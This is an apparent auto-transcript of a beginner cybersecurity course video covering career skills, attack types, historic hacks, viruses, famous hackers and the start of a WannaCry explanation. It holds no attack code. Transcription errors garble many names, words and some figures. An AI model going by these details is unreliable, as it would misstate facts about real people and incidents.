foreign
with just one click you can shop online
make online bake transfers like a post
on Instagram and much more as convenient
and exciting as it sounds have you ever
wondered how unsafe it could be to live
in this digital era is our data well
protected well no to help us tackle this
issue we have cyber security to our
rescue cyber security is the art of
protecting our networks and devices from
unauthorized access when I say
unauthorized access here it would refer
to a small or big Cyber attack or a
cyber threat there are various types of
cyber attacks that you can fall prey to
fishing malware attack DDOS attack
password attack and many more
a few ways to implement cyber security
are defining clear boundaries using
network security control devices like
firewalls and IDs and carrying out
security testing at any point in time
the CIA that is confidentiality
integrity and availability are being
implemented in an organization to ensure
that our information is secure there is
a great demand for professionals like
ethical hackers cisos and many more
cyber Security Experts who can Implement
cyber security and Safeguard an
organizations data so what are you
waiting for get certified with simply
learn and begin your lucrative cyber
security career this was cyber security
in short hey everyone welcome to this
informative video on cyber security
Focus this full course will acquaint you
with various cyber security Concepts
from scratch if you are a beginner in
this field not to worry you are at the
right place this cyber security tutorial
for beginners will guide you through
your cyber security Journey cyber
security is gaining popularity more than
ever given the current covid-19 scenario
and the entire world becoming virtual
according to a research study by Deep
Instinct ransomware increased by 435 in
2020 compared with 2019.
these numbers show that this is likely
to increase in 2021 and in the future
this shows how crucial it is to have
cyber security to put an end to such
cyber attacks now let's go ahead and get
started with our Learning Journey here
we will understand cyber security cyber
attacks cryptography and also look into
ethical hacking
we'll begin the cyber security tutorial
for beginners course with an interesting
introduction to cyber security
following which we will have a look at
the top five skills that are required
for your cyber security career next we
will look at the different types of
cyber attacks and then understand the
importance of cyber security and what
cyber security is all about moving
forward we will look into the concept of
ethical hacking along with a Hands-On
demo for each type of Cyber attack next
we will acquaint you with the concept of
cryptography following this we'll
briefly introduce you to the various
cyber security certifications available
today along with cyber security career
prospects the certifications we will be
talking about are the CompTIA Security
Plus certification the CH certification
along with the roles and
responsibilities of a certified ethical
hacker and the world-renowned cissp
certification we will then conclude the
cyber security pool course with a set of
the top 50 cyber security interview
questions and answers that can help you
crack your cyber security interview
for this training with me I have an
experienced cyber security specialist
bipin and beverage and together we will
take you through the various topics
inside the security cryptography and
ethical hacking all of this in Under 12
hours
so let's start off with an interesting
short video on cyber security but before
we begin make sure to subscribe to our
YouTube channel and hit the Bell icon to
never miss an update from Simply learn
with just one click you can shop online
make online bake transfers like a post
on Instagram and much more as convenient
and exciting as it sounds have you ever
wondered how unsafe it could be to live
in this digital era is our data well
protected well no to help us tackle this
issue we have cyber security to our
rescue cyber security is the art of
protecting our networks and devices from
unauthorized access when I say
unauthorized access here it would refer
to a small or big Cyber attack or a
cyber threat there are various types of
cyber attacks that you can fall prey to
fishing malware attack DDOS attack
password attack and many more
a few ways to implement cyber security
are defining clear boundaries using
network security control devices like
firewalls and IDs and carrying out
security testing at any point in time
the CIA that is confidentiality
integrity and availability are being
implemented in an organization to ensure
that our information is secure there is
a great demand for professionals like
ethical hackers cisos and many more
cyber Security Experts who can Implement
cyber security and Safeguard an
organization's data so what are you
waiting for get certified with simply
learn and begin your lucrative cyber
security career this was cyber security
in short meet Anne she often shops from
www.shoppingcart.com
she has her information like email ID
address and credit card details saved on
the website to enable a faster and
hassle-free shopping experience
the required information is stored in a
server one day Anne received an email
which stated her eligibility for a
special discount voucher from
shoppingcard.com in order to receive the
coupon code she was asked to fill in her
shopping cart.com account credentials
this didn't seem fishy to her at the
time as she thought it was just an
account verification step little did she
realize the danger she would be facing
she was knocked off her feet when a
substantial amount of money was wiped
off her account
how do you think this happened well yes
the email she received was fake and
shoppingcart.com account witnessed
unauthorized access from a third party
this type of attack is known as a Cyber
attack and the person who carries it out
is called a hacker could Anne have
prevented this attack
indeed she could have with the help of
cyber security cyber security involves
techniques that help in securing various
digital components networks data and
computer systems from unauthorized
digital access
there are multiple ways to implement
cyber security depending on the kind of
network you are connected to and the
type of cyber attacks you are prone to
so let's take a look at the various
cyber attacks that Anne could have been
exposed to one of the most common types
of cyber attacks is a malware attack
like Trojan adware to name a few
so the communication line between Ann
and the website is secretly intercepted
this commonly happens with unsecured
Wi-Fi networks and also through malware
password attack is one of the easiest
ways to hack a system here Anne's
password could have been cracked by
using either common passwords or trying
all possible alphabetical combinations
to prevent future cyber attacks and
sought to implement a few cybers first
she installed a firewall as the name
suggests it is a virtual wall between
Anne's computer and the internet
firewalls filter the incoming and
outgoing traffic from your device to
safeguard your network and they can
either be software applications or
Hardware reinforcements secondly an
implemented honey pots just like how
flowers attract bees dummy computer
systems called honeypots are used to
attract attackers these systems are made
to look vulnerable in order to deceive
attackers attackers and this in turn
defends the real system in addition to
these she also decided to use unique
alphanumeric passwords antivirus
software and started avoiding males from
unknown senders that was Anne's story
cyber attacks are not just confined to
individuals but also to public and
private organizations the cyber attacks
carried out in such places are more
deadly and they result in colossal
losses motives of such attacks are many
starting from tampering with crucial
data to monetary gains let's have a look
at a few of the cyber attacks that
companies are subjected to
various public sector organizations and
large corporations face the advanced
persistent threat apt
in this form of attack hackers gain
access to networks for a prolonged
period in order to continuously gain
confidential information
companies also witnessed the denial of
service attack where networks are
flooded with traffic which in turn
leaves legitimate service requests
unattended a variant of this is the
distributed denial of service DDOS
attack when multiple systems are used to
launch the attack when a hacker
manipulates a standard SQL query in a
database driven website it is known as a
SQL injection attack by doing so hackers
can view edit and delete tables from
databases amidst a plethora of cyber
attacks it is indeed a challenge for
organizations with several networks and
servers to ensure complete Security this
is not an easy task and to help with
this cyber Security Professionals are
hired to work on identifying cyber
threats and securing a company's Network
there are multiple job roles in the
field of cyber security if hacking
fascinates you then the role of an
ethical hacker is something to be
explored
such professionals try to a Network's
vulnerabilities just like how a hacker
would do but only to identify those
vulnerabilities and resolve them for
protection against an actual Cyber
attack but if you are looking to design
robust security structures then the role
of a security architect is more apt a
chief information security officer ciso
plays a crucial role in Enterprise
security and is entrusted with the
overall safety of the information in an
organization with the increase in the
production of global Digital Data it is
anticipated that cyber attacks will
quadruple in the near future
organizations are going to need cyber
security professionals who can prevent
these attacks
a career in the field of cyber security
is lucrative and a very smart decision
for professionals now so what are you
waiting for get certified with simply
learn and become a cyber security expert
with businesses moving online and
shifting to cloud storage currently the
demand for cyber security is at its peak
with that comes a high demand for cyber
Security Experts who can Safeguard
Digital Data according to cybercrime
magazine by cyber security Ventures
globally there would be nearly 3.5
million unfilled cyber security jobs by
2021 and the number of Internet users
will hit a whopping 6 billion by 2022
these numbers speak volumes and this
shows the growing demand for cyber
Security Professionals across the globe
now that you know the high demand for
cyber Security Professionals let us help
you start your cyber security career by
bagging the right skill set
many of you out there might be waiting
to become a cyber security professional
but are unsure of how to go about it and
what skills you would need to get a
cyber security job
not to worry we are here to help you
with that after extensive research we
have come up with the top 5 skills that
will help you get into the field of
cyber security let's have a look at
these skills individually
foreign
first we have networking and system
administration the number one skill you
need to have to enter the field of cyber
security is computer networking
networking is the backbone of the
internet it is imperative that you have
an in-depth understanding of networking
to start a career in cyber security a
network is a group of interconnected
devices and networking is the art of
understanding how data is sent
transmitted and received amongst these
devices
you need to know various routing
protocols the tcpip and OSI models
govern networking The OSI model is
comparatively newer basically in these
models all the protocols are grouped
into layers and work together to help
you receive data on your device sent
from a server learning networking will
help you understand the technical
aspects of data transmission which will
help you secure your data you can take
up networking certifications like
Security Plus and Cisco CCNA to gain a
strong networking Foundation
another skill thatly beneficial for you
is to Master System Administration
if you think about it all of us assist
admins at some level
system administration is all about
configuring and maintaining computers
you must be curious to know every aspect
of your computer features and settings
and play around a bit
carry out a trial and error method and
give yourself small tasks like
recovering deleted files or monitoring
old viruses on a VM explore new
techniques put them into use and expand
your knowledge
let us now move on to our second skill
knowledge of operating systems and
virtual machines
to become a cyber security professional
you need to have a strong knowledge of
operating environments such as Windows
Linux and Mac OS
cyber Security Professionals largely use
Linux and it comes with several tools
to learn operating systems go ahead and
set up and use Virtual machines that is
VMS and play around with them this will
help you gain hands-on experience
as a cyber security expert you should be
comfortable working on any OS VMS allow
you to train and research in an isolated
environment and help you maximize your
skills
the next point to remember is to know
Kali Linux it is the most widely known
Linux distribution for ethical hacking
and penetration testing
it comes with several hundred tools
related to penetration testing malware
analysis security research computer
forensics and so on
Kali contains several projects and you
can learn a lot another good thing about
Kali is that it is free to use so what
are you waiting for download and start
right away
remember that Linux is the backbone of
cyber security and a commonly asked
topic for cyber security interviews
especially for pen testing roles
moving on to our third skill our third
skill is network security control
it is another basic skill that every
cyber security professional should have
network security control refers to the
different measures which are employed to
enhance the security of a network
it is simple you can only Safeguard your
network if you know how it works how
routers firewalls and other devices work
a firewall is a hardware or software
that blocks incoming or outgoing traffic
from the internet to your computer
firewalls are required to secure a
network as a cyber security expert you
must be able to leverage a firewall to
filter and prevent unauthorized traffic
onto the network
in addition to that as a cyber security
expert you must know about intrusion
detection systems intuition prevention
systems virtual private networks and
remote access
and intrusion detection system IDs is
designed to detect unauthorized access
to a system
it is used together with a firewall and
a router
you should be able to operate the IDS
and recognize any security policy
violations and malicious traffic on the
network
as many of you may have used a VPN is a
connection between a VPN server and a
VPN client it is a secure tunnel across
the internet
moving on next up we have an interesting
skill any idea what that is if yes pause
and leave a comment as to what you think
the next skill will be if getting your
learning started is half the battle what
if you could do that for free visit
skillup by simply learn click on the
link in the description to know more
and before we jump into this skill if
you find this video interesting make
sure to give it a thumbs up
fourth skill on our list is coding
so you might be wondering if coding is
really required to become a cyber
security professional well it is true
that not all cyber Security
Professionals have or need coding skills
however having zero coding knowledge May
limit your opportunities in the future
knowing a couple of programming
languages will help you identify the
plan behind an attack and defend against
deadly hacking techniques
so as seen on your screens these are the
best programming languages to learn to
make your cyber security career
worthwhile
we have C and C plus plus the C
programming language is the backbone of
most operating systems C and C plus plus
are low level programming languages that
you need to know as a cyber security
professional
on the other hand python is a high level
programming language that is becoming
popular among cyber Security Experts
today knowing python will give you an
upper hand in your career it will help
you identify and fix vulnerabilities
JavaScript is another high level
programming language that adds
interactivity to web pages
a good advantage of knowing JavaScript
is that you can prevent cross-site
scripting attacks from occurring as in
these attacks the attacker implants
malicious code in a web application
speaking of PHP because most of the
websites are created using PHP learning
it will help you defend against
intruders
similarly HTML is another language cyber
Security Professionals should understand
as most websites use it and it is one of
the easiest languages to learn
another programming language that you
can use is golang it is great for
cryptography you can solve various cyber
security problems with it then we have
SQL that is structured query language
attackers use this language to damage
the stored data one such example is the
SQL injection attack hence having a good
understanding of SQL will be highly
beneficial
another Point we'd like to highlight is
to have knowledge of Assembly Language
this will help you become a cyber
security engineer assembly will help you
understand how malware functions and
thereby help you defend against it in
the cyber security domain you can't just
lock into a single language and hence it
is advised that you are acquainted with
a couple of them
you can also do a crash course with
these languages and learn them
hence determine the best programming
language for your cyber security role
and get familiar with the basics
moving on our fifth skill on the list is
cloud security
there is a growing demand for cyber
Security Professionals with Cloud
security skills in the coming years
companies are on the lookout for
professionals with security skills
applicable to public and hybrid Cloud
platforms such as Amazon web services
and Azure more organizations look to
Cloud infrastructure to store data and
run applications
this includes implementation of policies
and technologies that protect
cloud-based systems and devices
just like application development
security Cloud security also involves
building secure systems from the start
companies want professionals who can
manage the cloud security tools to
identify and prevent any Cloud breaches
people with experience and knowledge in
managing big platforms such as Microsoft
Azure AWS and the gcp are in high demand
now that we have seen the top 5 cyber
security skills let us go through a set
of additional skills that can help you
get into the cyber security field
remember that to become a successful
cyber security expert you must possess a
rich and diverse skill set
so in a list of additional skills first
we have risk analysis
identifying risks even before their
arrival is a great skill cyber Security
Professionals are required to identify
manage and mitigate risks
risk management and mitigation is a
skill set that is going to be highly in
demand in the coming years
next we have information security
companies require skilled professionals
who can protect their electronic data
from unauthorized taxes here in-demand
skills are authentication authorization
malware analysis and data recovery
next on our list is security incident
handling and response
as a cyber security expert you must be
prepared to handle any forthcoming
threat of violating an organization
security policy by following an updated
incident response plan your team can
proactively protect your data and
minimize the damages
in security Incident Management you are
required to identify manage record and
analyze security threats in real time
a security incident can be an active
threat or a successful compromise of
data or an attempted intrusion it can
also be incidents like DDOS attacks
fishing apt's ransomware and many more
another important pointer is that as a
security practitioner you must also
manage and analyze the security
information and even management Siem
tools and services
moving on we have security audit
security auditing is an internal check
that is carried out to find flaws in the
organization's information system you
must be able to conduct a review of the
organization's adherence to regulatory
guidelines security audit and compliance
knowledge are very crucial as any
mystery of Regulatory Compliance could
lead to Hefty penalties
soon organizations will need people who
are more familiar with the various data
privacy regulations if you are good at
paperwork you can capitalize on this
skill companies will need people who can
understand what paperwork to file and
which security protocols to use to
comply with the regulations
finally we have laws and regulations and
often Overlook cyber security aspect
there are several cyber security laws
and regulations and if you break these
laws intentionally or not it doesn't
matter as you will still be charged
these laws Define how you can use the
internet and it also defines how people
can be protected from becoming the
victims of cyber crimes knowing these
laws and regulations and following the
best practice will make you ethical at
your job and this will in turn be good
for your organization so those were our
list of additional skills apart from
these make sure you stay updated with
new hacks and learn new tools as cyber
security is ever evolving
another important skill apart from these
technical skills is your soft skills
having a set of good soft skills will
help you back your dream job we have a
video on the top 5 soft skills that will
help you grow in your career do watch
that and incorporate those skills as
well we bring you the top 10 computer
hacks of all time let's see what we have
at number 10. from April 27 2007 Estonia
the European country faced a series of
cyber attacks that lasted for weeks this
happened when the Estonian government
decided to move the bronze soldier from
Thailand Center to a less prominent
military cemetery located on the city's
outskirts
unprecedented levels of internet traffic
took down Estonian Banks online services
media Outlets broadcasters and
government bodies
botnet sent massive waves of spam and
vast amounts of automated Online
requests according to researchers the
public face DDOS attacks there were
conflicts to edit the English language
version of The Bronze soldiers Wikipedia
page as well although there is no
confirmation Russia is believed to be
behind these cyber attacks that largely
crippled the Estonian Society let's now
move on to the next attack on December
23 2015 several parts of Ukraine
witnessed a power outage and this was
not a typical blackout it was indeed the
result of a Cyber attack
Information Systems of three energy
distribution companies in Ukraine were
compromised it is the first known
Victorious Cyber attack on a par grid it
is said that here hackers sent out
phishing emails to the power companies
30 substations were Switched Off and
about 230 000 people were left in the
dark for about one to six hours U.S
investigators believed that russia-based
hackers were responsible for this
experts have warned that other countries
could also be vulnerable to such attacks
let's see what we have at number eight
in the year 1999 a Cyber attack cost a
21-day shutdown of NASA computers
unbelievable isn't it the hacker was
none other than the then 15 year old
Jonathan James he first penetrated U.S
Department of Defense divisions
computers and installed a back door on
its servers
this allowed him to intercept more than
a thousand government emails including
the ones containing usernames and
passwords this helped James steal a
piece of NASA software and crack the
NASA computers that support the
International Space Station which caused
the space exploration agency's forty one
thousand dollars assistance were shut
down for three weeks
he was the first person to carry out a
computer hack against the American space
agency let's now move on to the next
attack in late November 2014 there was a
leak of confidential data from the film
studio of Sunni pictures
information about Sony Pictures
employees their emails copies of the
then unreleased Sony films future
propositions and other crucial data were
leaked this Cyber attack was carried out
by a hacker grouped named Guardians Of
Peace so what did the hackers want well
they demanded that Sony withdraw its
then upcoming movie the interview this
movie was a comedy storyline to
assassinate the North Korean leader Kim
Jong-un Sony then decided to cancel the
film's theatrical release due to their
threats at Cinema screening the movie it
is indeed hard to trace the roots of a
Cyber attack in this case after
evaluation the U.S intelligence
officials arrived at the theory that the
attack was in a way related to the
government of North Korea
however North Korea had denied the same
moving on to our number six in December
2006 TJX the U.S retailer company
identified that 45.6 million debit and
credit card details were stolen
this happened from one of its systems
over 18 months by an unknown number of
intruders it was one of the first
largest ever cyber attacks involving the
loss of personal data as a result banks
in the affected regions had to reissue
and block thousands of payment cards a
group of hackers did this Albert
Gonzalez being The Mastermind the group
was from Miami the place where the TJX
Heist was believed to have originated
reports said that the TJX data breach
occurred because of weak web encryption
at two of its martial stores in Miami
next moving on to our top five let us
see what we have at number five
the year 2010 witnessed the discovery of
the deadly computer worm stuxnet
smalvis motive was unlike any other
usual cyber attacks it aimed at
destructing the equipment the computers
controlled
stuxnet came with a deadly purpose of
damaging Iran's nuclear infrastructure
it infected more than 200 000 computers
including 14 Industrial sites and a
uranium enrichment plant in Iran
stuxnet initially spread via Microsoft
Windows and targeted Siemens industrial
control systems
although it was discovered only in 2010
It is believed to have been silently
sabotaging Iran's nuclear facilities
it was one of the first discovered
malware that was capable of hampering
hardware systems it largely damaged the
centrifuges of the Iranian reactors this
is believed to be a cyber weapon created
by the U.S and the Israeli intelligence
although there is no documented evidence
or acceptance by either of the countries
for the same moving on to number four in
the year 2014 Home Depot was the victim
of one of the deadliest cyber attacks 56
million payment cards were compromised
along with 53 million customer email
addresses stolen this security breach
happened from April to September 2014.
criminals were believed to have used a
third-party vendor's username and
password to enter the perimeter of Home
Depot's Network
the attackers were then able to deploy
custom-built malware on its
self-checkout systems in the US and
Canada moving on to our top three
as you might be aware the PlayStation
gaming system is one of Sony's most
popular products unfortunately in April
2011 Sony Executives witnessed abnormal
activity on the PlayStation Network this
resulted in the compromise of
approximately 77 million PlayStation
users accounts and prevented users of
PlayStation 3 and PlayStation Portable
consoles from accessing the service
this forced Sony to turn off the
PlayStation Network on April 20th on May
4th Sony confirmed that personally
identifiable information from each of
the 77 million accounts had been exposed
the outage lasted for 23 days Sony
released almost daily announcements
concerning the system outage in the end
Sony is believed to have invested
approximately 170 million dollars to
improve the network security to
investigate the attack and to cover the
expenses of caring for the consumers
that had been affected let's now move on
to the next attack at number two in May
2017 one of the most dangerous cyber
attacks took place
it was known as the wannacry ransomware
attack caused by the wannacry cry crypto
worm the victims were the users that
used the unsupported version of
Microsoft Windows and those who hadn't
installed the new security update
this did not take place through fishing
like other attacks but through an
exposed vulnerable SMB port
the attack originated in Asia and then
eventually spread across the globe in a
day more than 200 000 computers were
infected across 150 countries
the wannacry cry cry crypto worm locked
the users out of the targeted systems
and encrypted their data the users were
asked for a ransom of 300 to 600 dollars
which had to be paid via Bitcoin in
exchange for their data this attack took
a toll on both private and government
organizations it resulted in Damages
from hundreds of millions to billions of
dollars in a matter of few days the
emergency patches released by Microsoft
halted the attack also the discovery of
a kill switch prevented the infected
computers from spreading the crypto worm
Security Experts in a few countries
believed that North Korea was behind
this attack and finally let's see what
we have at number one more than two
decades ago in March 1999 the Melissa
virus a mass mailing macro virus was
released
a targeted Microsoft Word and
outlook-based systems and created
considerable Network traffic Melissa
virus infected computers via emails the
email would look like an important
message well yes it was fake if the
recipient opens the attachments in the
mail and downloads the document and then
opens it with Microsoft Word a virus was
released on their computers
this would then Mass mail itself to the
first 50 people in the victim's contact
list and then disable multiple Safeguard
features on Microsoft Word and Microsoft
Outlook this began spreading like a
wildfire across the internet David L
Smith released the virus the virus cost
nearly 80 million worth of Damages it
did not steal data or money however it
cost a Havoc almost 1 million email
accounts were disrupted worldwide
agencies were overloaded and some had to
be shut down entirely and internet
traffic in some locations were slowed
down do you agree with our list if
you're aware of any other great
interesting computer hacks in history do
let us know in the comment section below
so moving on here's a list of the most
dangerous computer virus let's see what
we have at number one at number one we
have my dude my Doom was one of the
worst computer virus outbreaks in
history in 2004. this malware is
technically a worm spread by Marcy
mailing it broke previous marks set by
the so big worm and I love you to become
the fastest spreading email worm ever
email spammers appear to have hired my
Doom to spread spam via compromised PCS
users will open an attachment named mail
transaction fails that will be sent to
the victim its objective is to take down
popular websites like Google and lycos
my Doom cost estimated damage of 38
billion dollars in 2004 but its
inflation adjusted cost is 52.2 billion
US Dollars by that figure my Dome has
taken on a life of its own infecting
enough poorly protected machines to send
1.2 billion copies of itself per year 16
years after its creation my Doom one of
the most widely distributed viruses
infected one out of every 12 emails at
its height my Doom hit companies like
Google SEO group and Microsoft with the
distributed denial of service attack in
2004 16 to 25 percent of all emails had
been infected by my
on that note here's a question for you
which is the latest deadly computer
virus you have heard of do let us know
in the comment section below
at number two we have I love you the I
love you virus of 2000 spread by
delivering a fake love letter that
appeared to be a harmless text file this
attacker like my Dome sends copies of
itself to all of the email addresses on
the infected machines contact list it
had spread to over 10 million PCS within
a few days after its May 4 release
Arnold Guzman a college student from the
Philippines invented the virus he
created the virus to collect credentials
to log into internet sites he wanted to
utilize for free since he was shot on
cash according to reports he had no clue
how far his work would travel love
letter is another name for this virus
at number 3 on the list of dangerous
computer viruses we have code read code
red was a computer worm that emerged in
July 2001 and infected computers running
Microsoft's IIs web server the code red
worm had been released on July 13th but
on July 19 2001 another variant of the
worms spread rapidly and was reported to
infect over 250 000 computers in just
nine hours on that day the total number
of infected hosts reached 359 000.
the worm defaces the affected websites
to display the hacked by Chinese text
stream it was the first large-scale
thread that could successfully Target
Enterprise networks in August 2001 the
guardian reported that the FBI had
issued serious warnings to organizations
asking them to safeguard themselves
against this worm at number 4 we have
crypto Locker
the crypto virus popularly known as
crypto Locker is a ransomware virus that
encrypts files on a computer and Demands
a ransom in return for a decryption code
the crypto Locker malware spread between
early September 2013 and late May 2014.
the primary means of infection was via
phishing emails with malicious
attachments it was identified as a
trojan virus that targeted computers
running different versions of the
Windows operating system once the crypto
Locker is launched it encrypts many
files on a user's computer or hard
drives servers and other storage devices
throughout the organization crypto virus
attacks are rising with over 4000
attacks each day as per the U.S
government estimates more than one
billion dollars is paid in Ransom each
year at number 5 we have Melissa the
Melissa virus was one of the biggest and
earliest cyber threats in history
released in March 1999 Melissa started
spreading via email infecting thousands
of computers within ours the virus was
sent in a file called list dot doc which
contained passwords to censored websites
so when users downloaded the file and
opened it in Microsoft Word a macro
inside the document was executed and
emailed the list talk file to 50 people
listed in the user's email Alias file
email servers at more than 300 companies
and government agencies worldwide became
overloaded and some had to be shut down
entirely as per the usfpi report the
estimated cost for cleaning and
repairing affected computer systems was
18 million dollars and finally at number
six on the list of most dangerous
computer viruses we have Slammer on
Saturday January 25th 2003 the internet
was hit by a wish's computer worm known
as SQL slam
it brought down most of the world's SQL
servers and slowed down internet traffic
Bank ATMs were down Slammer was 376
bytes of malicious code that attempted
to connect to every computer it could
find over Ms SQL UDP Port 1434 causing
heavy Network traffic it is believed to
have infected over 75 000 systems within
10 minutes SQL Slammer was the fastest
spreading computer worm in history The
New York Times reported that Microsoft
admitted that some of its machines had
gone unpatched and that its MSN internet
service also had significant slowdowns
due to the slammer worm according to
cyber security Ventures the global
cybercrime cost is expected to grow and
reach 10.5 trillion US Dollars by 2025.
that's the cost we have to pay for cyber
crimes at number 10 we have Johnson
James Angela in the year 2006 Johnson
James and cheetah of Downey California
was charged for controlling huge number
of Partners In other words hijacked
computers
this was the first time that a hacker
who was sent to prison for the use of
botnet technology and should I use
botnets to compromise more than 400
000 computers advertising companies paid
him to install adware or bots on
specified systems it has also noted that
and cheetah advertised the sale of
expertness to those interested in
sending spam or launching D Rose attacks
without being identified he was also
pleaded guilty for infecting machines at
two U.S military sites which earned him
more than sixty one thousand dollars
Joss and James and Jada who was captured
in a well-planned and elaborate stink
operation when FBI agents coaxed him in
their office on the pretext of
collecting computer equipment he was
sentenced to nearly 60 months of
imprisonment and was ordered to pay 15
000 US dollars to the US federal
government for hacking their military
computers at number nine we have andren
lamo lamo began his hacking journey by
hacking games he was more likely a gray
hat hacker who wanted people to
understand the importance of Internet
Security
however it went far ahead when he hacked
the New York Times intranet in 2002. he
was called the homeless hacker for his
transient lifestyle and he often had no
fixed address he used to hack top-notch
accounts by sitting in cafeterias
libraries and so on he was convicted for
compromising security at the New York
Times Microsoft and Yahoo to name a few
he later gained the batch of an American
threat analyst he also appeared on Good
Morning America Fox News democracy Now
Etc as an expert on netcentric crime and
incidents laomo died in the year 2018 at
the age of 37. at number 8 we have Kevin
Paulson a former American black hat
hacker in the hacker Community he is
better known as dark Dante at the age of
17 he hacked the U.S Department of
Defense but he was left with a warning
as he was a minor later in 1990 Hebrew
propelled to stardom for infiltrating a
radio show calling contest and
guaranteeing that he will be the 102nd
caller to win the brand new Porsche 944s
team the FBI stated pursuing Paulson and
was soon arrested and sentenced to a
five years of imprisonment he was also
barred from using a computer or Internet
for three years post his release later
he took into white hat hacking and
journalism in the Year 2005 he became a
senior editor of wired news at number 7
we have the famous American hacker
Jonathan James bernones comrade he was
the first juvenile in the United States
to be sent to prison for hacking this
famous hack was his intrusion into the
defense threat reduction agency or dtra
computers a division of the United
States Department of Defense he
installed a back door on its servers
this enabled him to access has over 3
000 messages from government employees
various usernames passwords and other
confidential data
this helped change seal a piece of NASA
software and this forced NASA to shut
down computers for three weeks to fix
the issue at an estimated cost of 41 000
American dollars he was sentenced to six
months arrest in 2000. he carried out
his hacking using the Alias comrade he
specialized in hacking high profile
content systems however he had a better
ending in 2008. moving on to a hacker at
number six at number 6 we have anonymous
the anonymous group is an international
decentralized hacktivist movement that
is widely known for its cyber attacks
against several governments its agencies
and the Church of Scientology this group
is focused on the concept of social
justice the members of this group known
as anons are recognized in public by
wearing guy Fox masks however some
members cover their face without using
the well-known masks as well they are
known as being the digital Robin Hood
amongst its supporters one of the noted
incidents was in the year 2008 when the
group took up issue with the Church of
Scientology and began to disable their
websites they are also known for hacking
Vatican the FBI PayPal Sony the CIA
MasterCard Visa the Israeli Chinese
tunison and Ugandan garments while the
law enforcement agencies and FBI have
tracked down a few of the group's
members the lack of any proper hierarchy
makes it all almost impossible to
distinguish or eliminate the anonymous
groups as a whole at number 5 we have
the British deal Martha Raven and
Richard Price in 1994 the do hacked into
multiple U.S military systems including
the defense information system agency
Griffis Air Force Base and the Korean
Atomic Research Institute they
infiltrated into foreign systems by
transferring critical data of Korean
automatic Research Institute into the
United States Air Force system in 1996
baven was arrested for hacking incidents
related to U.S Air Force defense
manufacturer Lockheed NASA and NATO
the Pentagon described even as the
number one threat to U.S security and
possibly the single biggest threat to
World Peace since Adolf Hitler however
Raven claims he was looking to prove a
UFO conspiracy theory in 1997 price was
fined 1200 pounds after pleading guilty
to 12 offenses of gaining unauthorized
access to computer systems in March and
April 1994. having malicious purposes or
not even in price displayed that even
military networks are vulnerable now
moving on to a hacker at number four at
number 4 we have Astra this hacker is a
tad bit different from the others on
this list as he has never been publicly
identified the pen name of this hacker
Astra is a Sanskrit word for a weapon in
2008 it was reported that the
authorities apprehended him at that time
he was known as a 58 year old Greek
mathematician he hacked into France's
distort group systems and got his hands
on vulnerable weapons technology data
and then sold it to different countries
for a long period hastra was reported to
have sold the data to nearly 250 people
from across the world this in turn
caused the salt 360 million US dollars
of damage while the asterisk's real
identity was never discovered officials
have said that he had been wanted since
the year 2002. at number 3 we have the
famous American computer hacker Albert
Gonzalez he was responsible for carrying
out multiple hacks he is accused of
Mastermind finding the biggest fraud in
history that is the combined credit card
theft and reselling of nearly
170 million car and ATM numbers from the
Year 2005 to 2007. this shows how unsafe
internet banking can be at times this
was recorded to be one of the biggest
credit card thefts in history he carried
out this by installing a sniffer Albert
Gonzalez has also set to have been The
Mastermind of the TJX companies hack
wherein 45.6 million debit and Credit
numbers were stolen later in 2010 he was
sentenced to 20-year in federal prison
moving on to a hacker at number two at
number 2 we have Gary mckinson he is a
Scottish systems administrator and
hacker at use of carrying out the
biggest military computer hack of all
time in 2002 he identified himself as
solo through a note message on a U.S
army computer it was later found to be
Gary mckinson he was accused of
infiltrating 97 United States military
and NASA computers by installing virus
and deleting a few files over 13 months
between February 2001 and March 2002.
this was the biggest military computer
attack of all time they shut down the
U.S military's Washington Network for 24
hours what is fascinating is his reason
that much of his hacking was in search
of information on UFOs that he believed
the US government was hiding in its
military computers and finally let's see
who we have at number one at number one
we have Kevin metnik the now affluent
American entrepreneur was one of the
most Wanted cyber criminal of us Once
Upon a Time Kevin who is currently a
security consultant was once convicted
of hacking Motorola Nokia and Pentagon
Kevin mastered computer hacking and
social engineering early and got his
start as a team in 1982 he had the North
America second difference command this
achievement inspired the 1983 film war
games in 1989 he hacked digital
equipment corporations Network and made
copies of their software it's largely
believed that he once obtained full
control of Pacific Bell's Network to
merely prove that it could be done he
never exported the data he obtained
according to reports mitnik gained
unauthorized access to a dozens of
computer networks while he was a
fugitive after five years of
imprisonment midnik started afresh and
became a security consultant his neck
with computers is still remembered all
of these hackers were unbelievably
skilled in cyber Court few of them faced
Trail and time a few of others ever
since put their cyber skills to better
use by becoming security advisors and
helping humankind hacking skills aren't
a form of criminal Behavior if it is put
to good use where organizations have
faced cyber crimes in the recent past
the different types of cyber attacks the
reasons for the cyber attacks and then
we are going to dwell into what exactly
cyber security what is expected out of
us as cyber Security Experts to provide
as a cyber security solution then we're
going to look at some basic Network
terminologies which will help us
understand cyber security and some of
the terms that are utilized by experts
when we deal with cyber security the
goals that we want to achieve when I say
I want to be secure what exactly do I
mean when I want to secure an
organization what kind of security
parameters are we looking at then we are
going to look at different ways of
tackling cyber crime in today's world
and lastly we've got a very interesting
demo on Metasploit where we are going to
test a vulnerable machine and try to
hack it now Metasploit is a penetration
testing tool widely used by Security
Experts and hackers to test and try to
penetrate different systems so we have a
very good demo on that and we'll be
looking at at the end of this particular
video let's begin with the rise in cyber
crimes so let's talk about wannacry this
is something that happened way back in
2017 let's not say way back it's just
2019 two years back and it took the
World by storm so it was a Cyber attack
which encrypted the data of
organizations and then the hackers held
that organization Ransom by asking of
rather demanding money from them to
decrypt their own data so what exactly
happened the attack originated in Asia
and then spread across the rest of the
world note the date and how did this
happen there was a vulnerability that
was identified in Microsoft Windows the
SMB vulnerability SMB which is server
message block is essentially the file
sharing and the printer sharing services
that you use in a lan environment on
Windows operating system by default
these are enabled on your desktops and
there is a hardening guide that people
utilize to to either upgrade the version
of SMB to a more secure version or a
disabled SMP and uh utilize something
else now this was a known vulnerability
and this was targeted within days more
than 230 000 compute meters were
infected across 150 countries now when
we say this was identified Microsoft
knew of this vulnerability and in fact
they had released a patch in April of
2017 to mitigate this vulnerability
within two months of that release this
attack had happened now in a real world
scenario it is not possible for all the
servers and devices to be upgraded to
the latest patch level because
organizations need to test those patches
to see if those patches are going to
interfere with the services that they
are providing and hence no organization
will be completely patched up at any
point in time and this was the flaw that
sadly took down a lot of organizations
the patch was available but it wasn't a
testing somewhere not utilizing it yet
and they did not see it as a high value
risk and suddenly something happened and
wannacry took place now what happened
was a crypto worm called wannacry which
basically encrypts the data and locks
the user out of their own computers and
they get a screen in front of them which
says your data has been encrypted and it
